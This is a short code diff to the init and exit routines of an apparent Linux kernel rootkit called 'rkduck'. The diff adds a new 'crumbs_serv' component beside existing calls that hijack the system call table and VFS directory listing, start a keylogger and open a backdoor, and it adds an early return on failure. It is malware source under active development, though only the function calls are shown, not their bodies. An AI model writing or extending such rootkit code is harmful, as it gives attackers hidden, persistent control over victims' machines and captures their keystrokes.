@@ -10,6 +10,7 @@ int duck_init(void) {
         dbg("rkduck: sys_call_table found at %p\n", sys_call_table);
     } else {
         dbg("rkduck: sys_call_table not found, aborting\n");
+        return 0;
     }
 
     // set_page_rw((ptr_t) sys_call_table);
@@ -26,6 +27,7 @@ int duck_init(void) {
     vfs_hijack_start(vfs_original_iterate);
 
     keylogger_init();
+    crumbs_serv_init();
     backdoor();
     //persistence();
 
@@ -35,6 +37,7 @@ int duck_init(void) {
 void duck_exit(void) {
 
     keylogger_release();
+    crumbs_serv_release();
     backdoor_exit();
 
     char *argv[] = { "/bin/bash", "-c", FOREVER_STOP, NULL };
